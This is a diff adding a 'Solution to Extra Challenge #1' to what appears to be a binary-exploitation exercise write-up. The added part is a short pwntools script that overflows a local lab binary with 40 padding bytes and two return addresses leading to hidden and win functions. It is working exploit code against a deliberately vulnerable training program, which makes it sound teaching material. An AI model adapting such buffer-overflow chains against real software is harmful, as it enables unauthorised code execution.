@@ -155,3 +155,17 @@ payload += p64(buffer_address + len(padding))
 target.send(payload)
 target.interactive()
 ```
+
+## Solution to Extra Challenge #1:
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+target = process('./bin/bonus')
+
+payload = b'A' * 40 + p64(0x401156)  + p64(0x401173)    # 0x401156 = address of dothidden(); 0x401173 = address of win()
+
+target.send(payload)
+target.interactive()
+```
